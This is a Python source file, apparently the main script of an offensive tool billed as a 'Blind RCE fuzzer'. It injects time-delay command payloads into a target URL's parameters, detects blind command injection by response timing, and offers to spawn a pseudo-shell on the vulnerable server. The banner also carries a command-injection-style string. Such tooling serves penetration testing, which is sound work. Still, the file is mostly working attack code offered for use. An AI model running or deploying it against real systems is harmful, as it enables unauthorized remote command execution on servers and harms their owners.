import httpx
import time

from raycharles.shell import spawn_shell
from raycharles.utils import detect_parameters, detect_avg_ping
from raycharles.payloads import build_payload_generators

from argparse import ArgumentParser
from rich.console import Console


def main() -> int:
    console = Console(
        log_path=False,
        log_time_format="@ %X -> "
    )

    console.print(
        r"""
[red]
         _ _      _|_  _  _| _  _
        | (_|\/  (_| |(_|| |(/__\
             /                   
[/]
[bright_black]
'' 2>/dev/null; echo "[green]Blind RCE fuzzer[/]" #
[/]
        """
    )

    parser = ArgumentParser()

    parser.add_argument(
        "-u", "--url", metavar="<url>", help="Target URL", required=True
    )

    parser.add_argument(
        "-T",
        "--sleep-time",
        metavar="<seconds>",
        help="Sleep time",
        required=False,
        type=int,
        default=5,
    )

    parser.add_argument(
        "-t",
        "--timeout",
        metavar="<seconds>",
        help="Host timeout",
        required=False,
        default=20,
    )

    parser.add_argument(
        "--user-agent",
        metavar="<string>",
        help="User agent",
        required=False,
        default="HitTheRoad/Jack",
    )

    parser.add_argument(
        "--ac-requests-number",
        metavar="<int>",
        help="Requests number for auto-calibration",
        required=False,
        type=int,
        default=15,
    )

    parser.add_argument(
        "--show-urls",
        help="Show all URLs",
        required=False,
        action="store_true",
        default=False,
    )

    parser.add_argument(
        "--pseudo-shell",
        help="Ask to spawn a pseudo shell",
        required=False,
        action="store_true",
        default=False,
    )

    arguments = parser.parse_args()

    url = arguments.url
    sleep_time = arguments.sleep_time
    timeout = arguments.timeout + sleep_time
    user_agent = arguments.user_agent
    ac_requests_number = arguments.ac_requests_number

    console.log(f"Target URL: '{url}'")

    splitted_url = detect_parameters(url)

    if len(splitted_url) == 1:
        console.log("No parameter found.")
        return 1

    console.log(f"Using sleep time: {sleep_time}")

    session = httpx.Client(
        headers={"User-Agent": user_agent},
        timeout=timeout,
    )

    console.log(f"Sending {ac_requests_number} requests for auto-calibration...")

    average_ping = detect_avg_ping(session, url, ac_requests_number)

    console.log(f"Found average ping: ~ {round(average_ping, 2)}")

    for payload_func in build_payload_generators():
        if isinstance(payload_func, str):
            console.log(payload_func)
            continue

        payload = payload_func(f"sleep {sleep_time}")

        final_url  = ""

        for part in splitted_url:
            final_url += payload if part == "FUZZ" else part

        if arguments.show_urls:
            print(final_url)
            continue

        start_time = time.time()
        session.get(final_url)
        total_time = time.time() - start_time

        if sleep_time - average_ping <= total_time:
            console.log(
                f"Found potential injection with payload: [red]{payload}[/] (~ {round(total_time - average_ping, 2)})"
            )

            if arguments.pseudo_shell:
                user_input = (
                    console.input("Wanna spawn a pseudo-shell? \[y/N] ") or "N"
                ).lower()

                if user_input == "n":
                    continue

                spawn_shell(console, session, url, payload_func)
                return 0

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
